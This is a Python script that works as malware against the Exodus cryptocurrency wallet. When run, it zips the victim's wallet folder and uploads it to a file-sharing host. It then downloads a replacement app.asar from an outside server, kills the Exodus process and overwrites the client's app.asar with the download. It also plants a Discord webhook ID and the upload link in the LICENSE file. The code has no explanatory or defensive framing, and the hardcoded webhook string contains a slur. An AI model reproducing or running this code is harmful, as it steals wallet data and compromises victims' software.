import subprocess
import requests
import zipfile
import os
from urllib.request import Request, urlopen

def inject():
    procc = "exodus.exe"
    local = os.getenv("localappdata")
    roaming = os.getenv("APPDATA")
    path = f"{local}/exodus"
    if not os.path.exists(path): return
    listOfFile = os.listdir(path)
    apps = []
    for file in listOfFile:
        if "app-" in file:
            apps += [file]
    exodusPatchURL = "https://kekwltd.ru/exodus/app.asar"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    req = Request(exodusPatchURL, headers=headers)
    response = urlopen(req)
    hook = "https://discord.com/api/webhooks/827123456789012345/getn1gga"
    folder2 = f"{roaming}/Exodus/exodus.wallet"
    # zip folder2
    file2 = f"{roaming}/Exodus/exoduswallet.zip"
    with zipfile.ZipFile(file2, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for root, dirs, files in os.walk(folder2):
            for file in files:
               file_path = os.path.join(root, file)
               zip_file.write(file_path, os.path.relpath(file_path, folder2))
    url2 = 'https://store1.gofile.io/uploadFile'
    file3 = {'filesUploaded': open(file2, 'rb')}
    response2 = requests.post(url2, files=file3)
    exolink = response2.json()['data']['downloadPage']
    khook = f'{hook.split("webhooks/")[1]}:{exolink}'
    data = response.read()
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    for app in apps:
        try:
            fullpath = f"{path}/{app}/resources/app.asar"
            licpath = f"{path}/{app}/LICENSE"
            with open(fullpath, 'wb') as out_file1:
                out_file1.write(data)
            with open(licpath, 'w') as out_file2:
                out_file2.write(khook)
        except: pass
inject()